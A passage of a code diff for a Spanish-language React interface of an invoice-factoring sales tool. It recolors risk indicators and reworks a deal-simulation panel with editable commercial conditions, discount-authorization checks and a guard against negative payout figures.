+          <span className="t11 font-medium" style={{ color: cm ? "#EF4444" : "#2563EB" }}>{cm ? "Nuevo · 0% Security" : "Nuevo"}</span>
           <span className="t10" style={{ color: C.faint }}>{cm ? `opera con la competencia · ${fmtMM(cm.totalMM)} cedido (6m)` : "sin historia de Share of Wallet"}</span>
         </div>
         {cm ? (
@@ -3512,7 +3910,7 @@ function SowStatusPanel({ deal, sinCompetencia }) {
     );
   }
   const est = sow.EstadoSOW;
-  const nivCol = ({ green: "#16A34A", yellow: "#C2410C", red: "#DC2626", gray: "#6B7280" })[est.Nivel] || "#6B7280";
+  const nivCol = ({ green: "#16A34A", yellow: "#C2410C", red: "#EF4444", gray: "#6B7280" })[est.Nivel] || "#6B7280";
   const nivTxt = ({ green: "Saludable", yellow: "Atención · bajando", red: "Riesgo alto", gray: "Sin datos" })[est.Nivel] || "Sin datos";
   const meses = sow.HistoricoMensual || [];
   return (
@@ -3717,7 +4115,7 @@ function SowPieCompetencia({ cm }) {
 // Mismo set de flechas/iconos que la etiqueta SOW del chip (OppTags), para usarlo en el KPI Tendencia.
 function sowFlechaIcon(tend) {
   if (tend === "Creciendo") return { Icon: ArrowUpRight, c: "#16A34A", lab: "creciendo" };
-  if (tend === "Decreciente") return { Icon: ArrowDownRight, c: "#DC2626", lab: "bajando" };
+  if (tend === "Decreciente") return { Icon: ArrowDownRight, c: "#EF4444", lab: "bajando" };
   if (tend === "Nuevo") return { Icon: Sparkles, c: "#2563EB", lab: "nuevo" };
   return { Icon: ArrowRight, c: "#C2410C", lab: "estable" };
 }
@@ -3752,9 +4150,9 @@ function SowTab({ deal }) {
       <div className="mt-4 space-y-3">
         <div className="flex flex-wrap items-center gap-2">
           <span className="text-lg font-bold" style={{ color: C.ink }}>Share of Wallet</span>
-          <span className="rounded-full px-2.5 py-0.5 t11 font-medium" style={{ backgroundColor: "#fef2f2", color: "#DC2626" }}>Riesgo alto · 0%</span>
+          <span className="rounded-full px-2.5 py-0.5 t11 font-medium" style={{ backgroundColor: "#fef2f2", color: "#EF4444" }}>Riesgo alto · 0%</span>
         </div>
-        <div className="rounded-lg p-3 t12" style={{ backgroundColor: "#fef2f2", border: "1px solid #fecaca", color: "#991b1b" }}>
+        <div className="rounded-lg p-3 t12" style={{ backgroundColor: "#fef2f2", border: "1px solid #fecaca", color: "#EF4444" }}>
           Security tiene <b>0% de participación</b> en este cliente: cede {fmtMM(cm.totalMM)} a la competencia (últimos 6 meses) y nada a Security. Oportunidad de captura.
         </div>
         <CompetenciaCard cm={cm} />
@@ -3766,13 +4164,13 @@ function SowTab({ deal }) {
   const an = sow.Analisis || {};
   const sem = sow.HistoricoSemanal || [];
   const ult = sem.length ? sem[sem.length - 1] : {};
-  const nivCol = ({ green: "#16A34A", yellow: "#C2410C", red: "#DC2626", gray: "#6B7280" })[est.Nivel] || "#6B7280";
+  const nivCol = ({ green: "#16A34A", yellow: "#C2410C", red: "#EF4444", gray: "#6B7280" })[est.Nivel] || "#6B7280";
   const target = est.TargetPct != null ? est.TargetPct : (sow.SOWTargetPct || 0);
   const W = 620, H = 210, padL = 30, padR = 14, padT = 14, padB = 26, n = m.length || 1;
   const X = (i) => padL + (n > 1 ? i * (W - padL - padR) / (n - 1) : 0);
   const Y = (v) => padT + (100 - Math.max(0, Math.min(100, v || 0))) / 100 * (H - padT - padB);
   const pts = m.map((x, i) => `${X(i).toFixed(1)},${Y(x.SOWPct).toFixed(1)}`).join(" ");
-  const lineCol = sow.SOWTendencia === "Creciendo" ? "#16A34A" : sow.SOWTendencia === "Decreciente" ? "#dc2626" : "#703EFF";
+  const lineCol = sow.SOWTendencia === "Creciendo" ? "#16A34A" : sow.SOWTendencia === "Decreciente" ? "#EF4444" : "#703EFF";
   const fI = sowFlechaIcon(sow.SOWTendencia); const FlechaSow = fI.Icon;
   const kpis = [
     { l: "SOW actual", v: est.ActualPct != null ? Math.round(est.ActualPct) + "%" : "—", c: nivCol },
@@ -3862,11 +4260,11 @@ function descuentosDeal(deal, o) {
   const sum = (a) => a.reduce((s, x) => s + (x.desc || 0), 0);
   return { otros, mora, cxc, totOtros: sum(otros), totMora: sum(mora), totCxc: sum(cxc) };
 }
-function SimResumen({ deal, o, montoDocs, cantFacturas, usuario, bloqueado, antic, setAntic, comisO, setComisO, tasaPond, diasPond, reevalPend, onReevaluar, esJefe, usuarioCod, deudoresOp, tasaFuente }) {
-  const [open, setOpen] = useState(true);
+function SimResumen({ deal, o, montoDocs, cantFacturas, usuario, bloqueado, antic, setAntic, comisO, setComisO, tasaPond, diasPond, reevalPend, onReevaluar, esJefe, usuarioCod, deudoresOp, tasaFuente, colapsable }) {
   const [autorizSig, setAutorizSig] = useState(null); // firma de condiciones autorizadas por la jefatura
   const [solicSig, setSolicSig] = useState(null); // firma de condiciones con autorización solicitada
-  const [editCond, setEditCond] = useState(false); // edición de condiciones bajo demanda (botón)
+  const [editCond, setEditCond] = useState(false);
+  const [modoEdit, setModoEdit] = useState(false); // dentro del panel: lectura (Modificar) vs edición (Actualizar) // edición de condiciones bajo demanda (botón)
   const [reevaluando, setReevaluando] = useState(false); // corriendo el re-check de otorgamiento/verificación
   // Al agregar/quitar facturas, las condiciones quedan a re-evaluar: se deshabilitan hasta correr el re-check.
   const lanzarReeval = () => { setReevaluando(true); setTimeout(() => { setReevaluando(false); if (onReevaluar) onReevaluar(); }, 900); };
@@ -3876,6 +4274,11 @@ function SimResumen({ deal, o, montoDocs, cantFacturas, usuario, bloqueado, anti
   const lc = lineaCreditoDe(deal);
   const simNum = deal.negocioNum || (1000000 + (hashStr(deal.id) % 8999999));
   const montoDocsCLP = toCLP(montoDocs);
+  // Sin facturas seleccionadas no hay condiciones: los costos fijos (comision, gastos, IVA) se
+  // aplican igual sobre un monto documentos de 0 y dejaban un «Monto a Girar» NEGATIVO —la pantalla
+  // afirmando que la operacion le cuesta plata al cliente antes de que exista la oferta—. Se muestra
+  // el guion: es el mismo criterio con que el tubo dice «Sin simular».
+  const sinSeleccion = !cantFacturas || montoDocsCLP <= 0;
   // Condiciones ORIGINALES (referencia) y NUEVAS (editables por el ejecutivo). La tasa se edita a este
   // nivel: Diferencia de precio = Tasa × %Anticipo × Monto de facturas.
   const [orig] = useState(() => ({ tasa: +(tasaPond || 0).toFixed(2), antic, pctCom: 0, comMin: 2, comMax: 2, gastoOp: 26000, gastoDoc: 0 }));
@@ -3929,76 +4332,43 @@ function SimResumen({ deal, o, montoDocs, cantFacturas, usuario, bloqueado, anti
       <span className={`t11 ${bold ? "font-bold" : "font-medium"}`} style={{ color: C.ink }}>{fmtCLP(val)}</span>
     </div>
   );
-  return (
-    <div className="mt-3 rounded-xl" style={{ border: `1px solid ${C.line}` }}>
-      {/* Encabezado */}
-      <div className="flex flex-wrap items-start justify-between gap-3 p-4" style={{ borderBottom: `1px solid ${C.line}` }}>
-        <div>
-          <div className="t14 font-bold" style={{ color: C.ink }}>Resultado de la simulación #{simNum}</div>
-          <div className="t10" style={{ color: C.faint }}>{fecha} · Generada por {usuario}</div>
-        </div>
+  // Piezas del PANEL LATERAL. La atribución se usa además en la tarjeta, así que todas van a
+  // variables en vez de duplicar el JSX en los dos sitios.
+  // Un solo campo editable, con el aviso de atribución debajo cuando la tasa o la comisión
+  // mínima se salen de la banda del ejecutivo.
+  const campoCond = (k, paso) => {
+    const ev = k === "tasa" ? evalTasa : k === "comMin" ? evalCom : null;
+    const m = ev && ev.estado !== "ok" ? ATRIB_CHIP[ev.estado] : null;
+    return (
+      <div className="flex flex-col items-end">
+        <input type="number" step={paso} value={nc[k]} onChange={(e) => { setNcK(k, e.target.value); if (k === "antic") setAntic(Math.max(0, Math.min(100, +e.target.value || 0))); }}
+          className="w-24 rounded-md px-2 py-1 t11 text-right outline-none" style={{ border: `1px solid ${m ? m.fg : C.line}`, color: C.ink }} />
+        {ev && !(ev.estado === "ok" && ev.pctDesc <= 0) && (() => { const mm = ATRIB_CHIP[ev.estado]; return <div className="mt-0.5 t9 font-semibold" style={{ color: mm.fg }}>{mm.icon} {ev.pctDesc > 0 ? `−${ev.pctDesc}% · ` : ""}{mm.lbl}</div>; })()}
       </div>
-      {/* Condiciones comerciales — referencia (actuales); se editan con el botón "Editar condiciones".
-          Al agregar/quitar facturas quedan a re-evaluar: se deshabilitan (opacidad) con un botón
-          "Re-evaluar operación" al centro que dispara el re-check de otorgamiento/verificación. */}
-      <div className="relative mx-4 mt-3 rounded-lg p-3" style={{ backgroundColor: "#F9FAFB", border: "1px solid #FED7AA" }}>
-        <div style={{ opacity: reevalPend ? 0.4 : 1, pointerEvents: reevalPend ? "none" : "auto" }}>
-        <div className="flex items-center justify-between gap-2">
-          <div className="flex flex-wrap items-center gap-2">
-            <span className="t10 font-semibold uppercase tracking-wide" style={{ color: "#C2410C" }}>Condiciones comerciales</span>
-            {tasaFuente && (tasaFuente.usaUltNeg ? (
-              <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#eff6ff", color: "#2563EB", border: "1px solid #bfdbfe", cursor: "help" }} title={`La tasa ponderada por riesgo (${tasaFuente.riesgo}%) es menor a la del último negocio cursado (${tasaFuente.ultNeg ? tasaFuente.ultNeg.tasa : "—"}%${tasaFuente.ultNeg ? " · " + tasaFuente.ultNeg.id + " · " + tasaFuente.ultNeg.fecha : ""}): la simulación usa la tasa del último negocio.`}>↺ Tasa Últ. Negocio {tasaFuente.ultNeg ? tasaFuente.ultNeg.tasa + "%" : ""}</span>
-            ) : (
-              <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: C.greenBg, color: C.green, border: "1px solid #bbf7d0", cursor: "help" }} title={`Tasa ponderada por riesgo del deudor y plazo (${tasaFuente.riesgo}%)${tasaFuente.ultNeg ? " · igual o mayor a la del último negocio (" + tasaFuente.ultNeg.tasa + "%)" : " · cliente sin negocios previos"}.`}>⚖ Tasa ponderada riesgo</span>
-            ))}
-          </div>
-          {!bloqueado && !editCond && <button onClick={() => setEditCond(true)} className="inline-flex shrink-0 items-center gap-1 rounded-md px-2 py-1 t10 font-semibold" style={{ border: "1px solid #F97316", color: "#C2410C", backgroundColor: "#fff" }}><Pencil size={11} /> Editar condiciones</button>}
-        </div>
-        {editCond ? (
-          <table className="mt-2 w-full border-collapse t11">
-            <thead><tr>
-              <th className="px-1 py-1 text-left font-semibold" style={{ color: C.sub }}>Criterio</th>
-              <th className="px-1 py-1 text-right font-semibold" style={{ color: C.faint }}>Condiciones originales</th>
-              <th className="px-1 py-1 text-right font-semibold" style={{ color: "#C2410C" }}>Nuevas condiciones</th>
-            </tr></thead>
-            <tbody>
-              {[{ k: "tasa", l: "Tasa de negocio", suf: "%" }, { k: "antic", l: "Porcentaje de anticipo", suf: "%" }, { k: "pctCom", l: "Porcentaje de comisión", suf: "%" }, { k: "comMin", l: "Comisión mínima", sub: "Unidad de fomento" }, { k: "comMax", l: "Comisión máxima", sub: "Unidad de fomento" }, { k: "gastoOp", l: "Gasto por operación", sub: "Peso chileno" }, { k: "gastoDoc", l: "Gasto por documento", sub: "Peso chileno" }].map((cr) => (
-                <tr key={cr.k} style={{ borderBottom: `1px solid ${C.line}` }}>
-                  <td className="px-1 py-1.5"><div style={{ color: C.ink }}>{cr.l}</div>{cr.sub && <div className="t9" style={{ color: C.faint }}>{cr.sub}</div>}</td>
-                  <td className="px-1 py-1.5 text-right" style={{ color: C.faint }}>{orig[cr.k]}{cr.suf || ""}</td>
-                  <td className="px-1 py-1.5 text-right">
-                    <input type="number" step={cr.k === "tasa" || cr.k === "pctCom" ? "0.01" : "1"} value={nc[cr.k]} onChange={(e) => { setNcK(cr.k, e.target.value); if (cr.k === "antic") setAntic(Math.max(0, Math.min(100, +e.target.value || 0))); }} className="w-24 rounded-md px-2 py-1 t11 text-right outline-none" style={{ border: `1px solid ${(cr.k === "tasa" ? evalTasa : cr.k === "comMin" ? evalCom : null) && (cr.k === "tasa" ? evalTasa : evalCom).estado !== "ok" ? ATRIB_CHIP[(cr.k === "tasa" ? evalTasa : evalCom).estado].fg : C.line}`, color: C.ink }} />
-                    {(cr.k === "tasa" || cr.k === "comMin") && (() => { const ev = cr.k === "tasa" ? evalTasa : evalCom; if (ev.estado === "ok" && ev.pctDesc <= 0) return null; const m = ATRIB_CHIP[ev.estado]; return <div className="mt-0.5 t9 font-semibold" style={{ color: m.fg }}>{m.icon} {ev.pctDesc > 0 ? `−${ev.pctDesc}% · ` : ""}{m.lbl}</div>; })()}
-                  </td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
-        ) : (
-          <div className="mt-2 grid grid-cols-2 gap-2 sm:grid-cols-4">
-            {[["Tasa de negocio", `${nc.tasa}%`], ["% Anticipo", `${nc.antic}%`], ["Comisión", fmtCLP(comisionCLP)], ["Gastos", fmtCLP(gastosCLP)]].map(([l, v]) => (
-              <div key={l} className="rounded-lg p-2" style={{ backgroundColor: "#fff", border: `1px solid ${C.line}` }}>
-                <div className="t9 uppercase tracking-wide" style={{ color: C.faint }}>{l}</div>
-                <div className="mt-0.5 t14 font-semibold" style={{ color: C.ink }}>{v}</div>
-              </div>
-            ))}
-          </div>
-        )}
-        {/* Atribución del ejecutivo por banda de tasa + autorización de jefatura cuando se excede. */}
-        {bandaRef && (
-          <div className="mt-2 t9" style={{ color: C.faint }}>
-            Atribución (banda tasa {bandaRef.tMin}%–{bandaRef.tMax === Infinity ? "+" : bandaRef.tMax + "%"}): descuento ejecutivo <b style={{ color: C.sub }}>{bandaRef.descEjec}%</b> · máximo con jefatura <b style={{ color: C.sub }}>{bandaRef.descMax}%</b> · tasa mínima absoluta {CFG_ATRIB_DESCUENTO.tasaMinAbsoluta}%.
-          </div>
-        )}
-        {atrib.estado !== "ok" && (
+    );
+  };
+  // Fila del desglose: monto a la izquierda y, sólo al editar, el parámetro que lo produce
+  // —valor original y campo nuevo— a la derecha. `k` es la clave del criterio; sin ella la fila
+  // es sólo un monto (IVA, recargos) o sólo un parámetro sin monto propio (comisión mín/máx).
+  const FilaSim = ({ label, val, bold, info, k, suf, paso, sangria }) => (
+    <div className="flex items-center gap-3 py-1.5" style={{ borderBottom: `1px solid ${C.line}`, paddingLeft: sangria ? 20 : 0 }}>
+      <span className={`flex flex-1 items-center gap-1.5 ${bold ? "font-semibold" : ""} t11`} style={{ color: bold ? C.ink : C.sub }}>
+        {label}{info && <span title={info} className="inline-flex h-3.5 w-3.5 items-center justify-center rounded-full t8" style={{ border: `1px solid ${C.faint}`, color: C.faint, cursor: "help" }}>i</span>}
+      </span>
+      <span className={`t11 ${bold ? "font-bold" : "font-medium"}`} style={{ color: C.ink, minWidth: 112, textAlign: "right" }}>{val == null ? "" : fmtCLP(val)}</span>
+      {modoEdit && <span className="t11" style={{ color: C.faint, minWidth: 84, textAlign: "right" }}>{k ? `${orig[k]}${suf || ""}` : ""}</span>}
+      {modoEdit && <span style={{ minWidth: 104, textAlign: "right" }}>{k ? campoCond(k, paso) : null}</span>}
+    </div>
+  );
+  const bloqueAtribucion = atrib.estado === "ok" ? null : (
           <div className="mt-2 rounded-lg p-2.5" style={{ backgroundColor: bloqueoDuro ? "#fef2f2" : "#FFF7ED", border: `1px solid ${bloqueoDuro ? "#fecaca" : "#FED7AA"}` }}>
-            <div className="flex items-center gap-1.5 t11 font-semibold" style={{ color: bloqueoDuro ? "#DC2626" : requiereGerente ? "#DC2626" : "#C2410C" }}>
+            <div className="flex items-center gap-1.5 t11 font-semibold" style={{ color: bloqueoDuro ? "#EF4444" : requiereGerente ? "#EF4444" : "#C2410C" }}>
               <AlertTriangle size={12} /> {atrib.estado === "bajoMinimo" ? "Tasa bajo el mínimo permitido — no ofertable" : requiereGerente ? "Descuento sobre el máximo de jefatura — requiere autorización del Gerente Comercial" : "Descuento sobre tu atribución — requiere autorización de jefatura"}
             </div>
             <div className="mt-1 t10" style={{ color: C.sub }}>Descuento aplicado <b>{atrib.pctDesc}%</b>{bandaRef && <> · tu atribución <b>{bandaRef.descEjec}%</b> · máximo con jefatura <b>{bandaRef.descMax}%</b></>}{requiereGerente && <> · sobre el máximo requiere <b>Gerente Comercial</b></>}. Controlado sobre tasa y comisión.</div>
             {puedeAutorizar && !bloqueoDuro && <div className="mt-1 t9" style={{ color: C.faint }}>Operación: {[...new Set((deudoresOp || []).map((f) => f.deudor))].slice(0, 4).join(", ") || deal.deudor} · {(deudoresOp || []).length || deal.facturas} factura(s) · {fmtMM((deudoresOp || []).reduce((s, f) => s + (f.montoMM || 0), 0) || deal.amountMM)}.</div>}
             {bloqueoDuro ? (
-              <div className="mt-1.5 t9" style={{ color: "#DC2626" }}>Ajusta la tasa dentro de la tasa mínima permitida para poder ofertar.</div>
+              <div className="mt-1.5 t9" style={{ color: "#EF4444" }}>Ajusta la tasa dentro de la tasa mínima permitida para poder ofertar.</div>
             ) : autorizado ? (
               <div className="mt-1.5 inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: C.greenBg, color: C.green }}><Check size={10} /> Condiciones autorizadas por {requiereGerente ? "el Gerente Comercial" : "la jefatura"}</div>
             ) : puedeAutorizar ? (
@@ -4012,45 +4382,9 @@ function SimResumen({ deal, o, montoDocs, cantFacturas, usuario, bloqueado, anti
               <button onClick={solicitarAutorizacion} className="mt-1.5 inline-flex items-center gap-1 rounded-full px-3 py-1 t10 font-semibold" style={{ border: "1px solid #C2410C", color: "#C2410C", backgroundColor: "#fff" }}><AlertTriangle size={11} /> Solicitar autorización de {rolAut === "jefatura" ? "jefatura" : "Gerente Comercial"}</button>
             )}
           </div>
-        )}
-        {/* Acción de la edición SIEMPRE abajo (no se duplica con «Listo» arriba). Cuando hay que pedir
-            aprobación, el botón de arriba es «Solicitar autorización»; si no, se muestra «Listo». */}
-        {editCond && !bloqueado && !(atrib.estado !== "ok" && !bloqueoDuro && !autorizado && !puedeAutorizar && !solicitado) && (
-          <button onClick={() => setEditCond(false)} className="mt-2.5 inline-flex items-center gap-1.5 rounded-full px-4 py-1.5 t10 font-semibold text-white" style={{ backgroundColor: "#16A34A" }}><Check size={12} /> Listo · aplicar condiciones</button>
-        )}
-        </div>
-        {reevalPend && (
-          <div className="absolute inset-0 flex items-center justify-center rounded-lg" style={{ backgroundColor: "rgba(249,250,251,0.55)" }}>
-            <button onClick={lanzarReeval} disabled={reevaluando} className="inline-flex items-center gap-1.5 rounded-full px-4 py-2 t11 font-semibold text-white" style={{ backgroundColor: reevaluando ? C.faint : "#C2410C", boxShadow: "0 6px 16px rgba(194,65,12,.25)" }}>
-              <RotateCcw size={13} className={reevaluando ? "animate-spin" : ""} /> {reevaluando ? "Re-evaluando…" : "Re-evaluar operación"}
-            </button>
-          </div>
-        )}
-      </div>
-      {/* Desglose */}
-      <div className="p-4">
-        <Row label="Monto Documentos" val={montoDocsCLP} bold />
-        <Row label={`Monto Anticipo (${nc.antic}%)`} val={anticipoCLP} bold />
-        <div className="py-1.5" style={{ borderBottom: `1px solid ${C.line}` }}>
-          <button onClick={() => setOpen((v) => !v)} className="flex items-center gap-1.5 t11 font-semibold" style={{ color: C.ink }}>{open ? <ChevronUp size={14} /> : <ChevronDown size={14} />} Descuentos</button>
-          {open && (
-            <div className="mt-1.5 pl-5">
-              <Row label="Diferencia de precio" val={difPrecioCLP} />
-              <Row label="Comisión" val={comisionCLP} />
-              <Row label="Gastos" val={gastosCLP} info="Gastos de operación y documentos" />
-              <Row label="IVA" val={ivaCLP} />
-              <Row label="Recargos" val={recargosCLP} info="Recargos por mora u otras condiciones" />
-              <Row label="Descuentos" val={descuentosCLP} info="Otros descuentos aplicados" />
-              <Row label="Cuentas por cobrar" val={cxcCLP} info="Saldos por cobrar rebajados del giro" />
-              <Row label="Subtotal Descuentos" val={subtotalCLP} bold />
-            </div>
-          )}
-        </div>
-        <div className="flex items-center justify-between py-2.5"><span className="t13 font-bold" style={{ color: C.ink }}>Monto a Girar</span><span className="t14 font-bold" style={{ color: C.indigo }}>{fmtCLP(giroCLP)}</span></div>
-        <div className="t10" style={{ color: "#7C3AED" }}>Retenciones: esta simulación considera una retención de {fmtCLP(retencionCLP)}, la cual se liberará si las facturas se pagan en la fecha informada.</div>
-        {/* Comparativo: últimas operaciones cursadas y sus condiciones (referencia para fijar la tarifa) */}
-        {histOps.length > 0 && (
-          <div className="mt-4 border-t pt-3" style={{ borderColor: C.line }}>
+  );
+  const tablaHistorica = histOps.length === 0 ? null : (
+          <div className="mt-3 rounded-xl p-3" style={{ backgroundColor: "#EFF6FF" }}>
             <div className="t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Últimas operaciones cursadas · referencia de condiciones</div>
             <div className="mt-0.5 t9" style={{ color: C.faint }}>Condiciones pactadas antes con este cliente — úsalas como referencia para decidir cuánto cobrar en esta operación.</div>
             <table className="mt-2 w-full border-collapse t10">
@@ -4071,8 +4405,147 @@ function SimResumen({ deal, o, montoDocs, cantFacturas, usuario, bloqueado, anti
               </tbody>
             </table>
           </div>
+  );
+  const bloqueDesglose = (
+        <div>
+        {modoEdit && (
+          <div className="flex items-center gap-3 pb-1">
+            <span className="flex-1" /><span style={{ minWidth: 112 }} />
+            <span className="t9 uppercase tracking-wide" style={{ color: C.faint, minWidth: 84, textAlign: "right" }}>Originales</span>
+            <span className="t9 uppercase tracking-wide" style={{ color: "#C2410C", minWidth: 104, textAlign: "right" }}>Nuevas</span>
+          </div>
+        )}
+        <FilaSim label="Monto Documentos" val={montoDocsCLP} bold />
+        <FilaSim label={`Monto Anticipo (${nc.antic}%)`} val={anticipoCLP} bold k="antic" suf="%" paso="1" />
+        <FilaSim label="Subtotal Descuentos" val={subtotalCLP} bold />
+        <FilaSim label="Diferencia de precio" val={difPrecioCLP} k="tasa" suf="%" paso="0.01" sangria />
+        <FilaSim label="Comisión" val={comisionCLP} k="pctCom" suf="%" paso="0.01" sangria />
+        {/* Estos dos no tienen monto propio: son topes en UF sobre la comisión de arriba, así que
+            sólo aparecen cuando hay algo que editar. */}
+        {modoEdit && <FilaSim label="Comisión mínima (UF)" k="comMin" paso="1" sangria />}
+        {modoEdit && <FilaSim label="Comisión máxima (UF)" k="comMax" paso="1" sangria />}
+        <FilaSim label="Gastos" val={gastosCLP} info="Gastos de operación y documentos" k="gastoOp" paso="1" sangria />
+        {modoEdit && <FilaSim label="Gasto por documento" k="gastoDoc" paso="1" sangria />}
+        <FilaSim label="IVA" val={ivaCLP} sangria />
+        <FilaSim label="Recargos" val={recargosCLP} info="Recargos por mora u otras condiciones" sangria />
+        <FilaSim label="Descuentos" val={descuentosCLP} info="Otros descuentos aplicados" sangria />
+        <FilaSim label="Cuentas por cobrar" val={cxcCLP} info="Saldos por cobrar rebajados del giro" sangria />
+        <div className="flex items-center gap-3 py-2.5">
+          <span className="flex-1 t13 font-bold" style={{ color: C.ink }}>Monto a Girar</span>
+          <span className="t14 font-bold" style={{ color: C.indigo, minWidth: 112, textAlign: "right" }}>{fmtCLP(giroCLP)}</span>
+          {modoEdit && <><span style={{ minWidth: 84 }} /><span style={{ minWidth: 104 }} /></>}
+        </div>
+        <div className="t10" style={{ color: "#7C3AED" }}>Retenciones: esta simulación considera una retención de {fmtCLP(retencionCLP)}, la cual se liberará si las facturas se pagan en la fecha informada.</div>
+        </div>
+  );
+  // Los valores se aplican a medida que se escriben, así que «Actualizar» sólo cierra la edición:
+  // el desglose de arriba ya muestra el resultado. Queda deshabilitado mientras la atribución no se
+  // resuelva por alguna vía (autorizada, solicitada, o el propio usuario puede autorizarla).
+  const atribSinVia = atrib.estado !== "ok" && !bloqueoDuro && !autorizado && !puedeAutorizar && !solicitado;
+  const barraAccion = (
+    <div className="mt-3 rounded-lg p-3" style={{ backgroundColor: "#F3F4F6" }}>
+      {modoEdit && bloqueAtribucion}
+      {/* La banda de atribución y el botón comparten línea: el texto es la referencia para decidir
+          cuánto mover la tasa, así que va al lado de la acción y no encima. */}
+      <div className="flex items-center justify-between gap-3" style={{ marginTop: modoEdit && atrib.estado !== "ok" ? 8 : 0 }}>
+        <div className="min-w-0 flex-1 t9" style={{ color: C.faint }}>
+          {modoEdit && bandaRef && <>Atribución (banda tasa {bandaRef.tMin}%–{bandaRef.tMax === Infinity ? "+" : bandaRef.tMax + "%"}): descuento ejecutivo <b style={{ color: C.sub }}>{bandaRef.descEjec}%</b> · máximo con jefatura <b style={{ color: C.sub }}>{bandaRef.descMax}%</b> · tasa mínima absoluta {CFG_ATRIB_DESCUENTO.tasaMinAbsoluta}%.</>}
+        </div>
+        {modoEdit ? (
+          <button onClick={() => setModoEdit(false)} disabled={bloqueoDuro || atribSinVia} title={bloqueoDuro ? "La tasa está bajo el mínimo permitido" : atribSinVia ? "Las condiciones requieren autorización" : undefined}
+            className="shrink-0 rounded-full px-4 py-1.5 t10 font-semibold text-white disabled:opacity-40 disabled:cursor-not-allowed" style={{ backgroundColor: C.indigo }}>Actualizar</button>
+        ) : !bloqueado ? (
+          <button onClick={() => setModoEdit(true)} className="shrink-0 rounded-full px-4 py-1.5 t10 font-semibold text-white" style={{ backgroundColor: C.indigo }}>Modificar</button>
+        ) : null}
+      </div>
+    </div>
+  );
+  return (
+    // Embebida, el contenedor del sub-tab Detalle ya dibuja el borde de la tarjeta: con el propio
+    // quedaban dos bordes concéntricos separados por el padding.
+    <div className={colapsable ? "" : "mt-3 rounded-xl"} style={colapsable ? undefined : { border: `1px solid ${C.line}` }}>
+      {/* Encabezado — se omite embebido: el contexto ya lo da la pantalla de Detalle. */}
+      {!colapsable && <div className="flex flex-wrap items-start justify-between gap-3 p-4" style={{ borderBottom: `1px solid ${C.line}` }}>
+        <div>
+          <div className="t14 font-bold" style={{ color: C.ink }}>Resultado de la simulación #{simNum}</div>
+          <div className="t10" style={{ color: C.faint }}>{fecha} · Generada por {usuario}</div>
+        </div>
+      </div>}
+      {/* Condiciones comerciales — referencia (actuales); se editan con el botón "Editar condiciones".
+          Al agregar/quitar facturas quedan a re-evaluar: se deshabilitan (opacidad) con un botón
+          "Re-evaluar operación" al centro que dispara el re-check de otorgamiento/verificación. */}
+      {/* Embebida en Detalle la tarjeta va en gris neutro y sin borde naranja: el naranja es el
+          acento de «hay algo que revisar» y acá sólo se están mostrando los montos de la operación.
+          Suelta (sub-tab propio) conserva su tratamiento. */}
+      <div className={colapsable ? "relative p-3" : "relative mx-4 mt-3 rounded-lg p-3"} style={colapsable ? { backgroundColor: "#ECECF1" } : { backgroundColor: "#F9FAFB", border: "1px solid #FED7AA" }}>
+        {/* Embebida, el atenuado y el botón los pone el bloque completo (resumen + condiciones)
+            del sub-tab Detalle: acá se superponían dos atenuados y dos botones para lo mismo. */}
+        <div style={!colapsable && reevalPend ? { opacity: 0.4, pointerEvents: "none" } : undefined}>
+        <div className="flex items-center justify-between gap-2">
+          <div className="flex flex-wrap items-center gap-2">
+            {!colapsable && <span className="t10 font-semibold uppercase tracking-wide" style={{ color: "#C2410C" }}>Condiciones comerciales</span>}
+            {tasaFuente && (tasaFuente.usaUltNeg ? (
+              <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#fff", color: "#2563EB", border: "1px solid #bfdbfe", cursor: "help" }} title={`La tasa ponderada por riesgo (${tasaFuente.riesgo}%) es menor a la del último negocio cursado (${tasaFuente.ultNeg ? tasaFuente.ultNeg.tasa : "—"}%${tasaFuente.ultNeg ? " · " + tasaFuente.ultNeg.id + " · " + tasaFuente.ultNeg.fecha : ""}): la simulación usa la tasa del último negocio.`}>Tasa Últ. Negocio {tasaFuente.ultNeg ? tasaFuente.ultNeg.tasa + "%" : ""}</span>
+            ) : (
+              <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#fff", color: C.green, border: "1px solid #bbf7d0", cursor: "help" }} title={`Tasa ponderada por riesgo del deudor y plazo (${tasaFuente.riesgo}%)${tasaFuente.ultNeg ? " · igual o mayor a la del último negocio (" + tasaFuente.ultNeg.tasa + "%)" : " · cliente sin negocios previos"}.`}>Tasa ponderada riesgo</span>
+            ))}
+          </div>
+          {/* Abre en LECTURA: primero el desglose, y desde ahí se decide editar. */}
+          {!bloqueado && !editCond && <button onClick={() => { setEditCond(true); setModoEdit(false); }} className="inline-flex shrink-0 items-center gap-1 rounded-md px-2 py-1 t10 font-semibold" style={{ border: `1px solid ${colapsable ? C.indigo : "#F97316"}`, color: colapsable ? C.indigo : "#C2410C", backgroundColor: "#fff" }}><Pencil size={11} /> Modificar</button>}
+        </div>
+          <div className="mt-2 grid grid-cols-2 gap-2 sm:grid-cols-5">
+            {[["Monto Documentos", fmtCLP(montoDocsCLP)], [`Diferencia de precio (${nc.tasa}%)`, fmtCLP(difPrecioCLP)], [`Monto Anticipo (${nc.antic}%)`, fmtCLP(anticipoCLP)], ["Subtotal Descuentos", fmtCLP(subtotalCLP)], ["Monto a Girar", fmtCLP(giroCLP)]].map(([l, v], i) => (
+              <div key={l} className="rounded-lg p-2" style={{ backgroundColor: "#fff", border: `1px solid ${C.line}` }}>
+                <div className="t9 uppercase tracking-wide" style={{ color: C.faint }}>{l}</div>
+                <div className="mt-0.5 t14 font-semibold" style={{ color: sinSeleccion ? C.faint : (i === 4 ? C.indigo : C.ink) }}>{sinSeleccion ? "—" : v}</div>
+              </div>
+            ))}
+          </div>
+        {/* Atribución del ejecutivo por banda de tasa + autorización de jefatura cuando se excede.
+            Embebida no se repite: el panel lateral de «Editar condiciones» la lleva completa. */}
+        {bandaRef && !colapsable && (
+          <div className="mt-2 t9" style={{ color: C.faint }}>
